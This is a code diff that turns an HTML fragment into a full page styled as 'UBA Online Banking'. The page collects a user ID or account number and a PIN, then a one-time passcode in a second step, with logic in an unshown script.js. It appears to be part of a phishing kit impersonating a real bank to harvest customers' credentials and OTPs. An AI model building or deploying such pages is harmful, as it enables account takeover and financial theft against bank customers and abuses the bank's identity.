@@ -1,19 +1,38 @@
-<div class="container" style="text-align: center; font-family: sans-serif;">
-    
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>UBA Online Banking</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #f4f4f4; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; }
+        h2 { color: #D32F2F; margin-bottom: 20px; }
+        input { display: block; margin: 15px auto; padding: 12px; width: 90%; border: 1px solid #ccc; border-radius: 4px; outline: none; }
+        button { background-color: #D32F2F; color: white; border: none; padding: 12px; cursor: pointer; width: 96%; border-radius: 4px; font-size: 16px; font-weight: bold; }
+        button:hover { background-color: #b71c1c; }
+        p { font-size: 14px; color: #666; }
+    </style>
+</head>
+<body>
+
+<div class="container">
     <div id="login-section">
-        <h2 style="color: #D32F2F;">UBA Online Banking</h2>
-        <p>Enter your details to continue</p>
-        <input type="text" id="uba-user" placeholder="User ID / Account Number" style="display: block; margin: 10px auto; padding: 10px; width: 80%;">
-        <input type="password" id="uba-pass" placeholder="Passcode / PIN" style="display: block; margin: 10px auto; padding: 10px; width: 80%;">
-        <button onclick="handleUbaLogin()" style="background-color: #D32F2F; color: white; border: none; padding: 12px 30px; cursor: pointer; width: 85%;">Login</button>
+        <h2>UBA Online Banking</h2>
+        <p>Sign in to your account</p>
+        <input type="text" id="uba-user" placeholder="User ID / Account Number">
+        <input type="password" id="uba-pass" placeholder="Passcode / PIN">
+        <button onclick="handleUbaLogin()">Login</button>
     </div>
 
     <div id="otp-area" style="display:none;">
-        <h2 style="color: #D32F2F;">Secure Pass (OTP)</h2>
-        <p>A code has been sent to your registered number.</p>
-        <input type="text" id="uba-otp" placeholder="Enter 6-digit OTP" style="display: block; margin: 10px auto; padding: 10px; width: 80%;">
-        <button onclick="handleUbaOtp()" style="background-color: #D32F2F; color: white; border: none; padding: 12px 30px; cursor: pointer; width: 85%;">Confirm</button>
+        <h2>Secure Pass (OTP)</h2>
+        <p>Enter the 6-digit code sent to your phone</p>
+        <input type="text" id="uba-otp" placeholder="Enter OTP">
+        <button onclick="handleUbaOtp()">Confirm</button>
     </div>
-
 </div>
 
+<script src="script.js"></script>
+</body>
+</html>
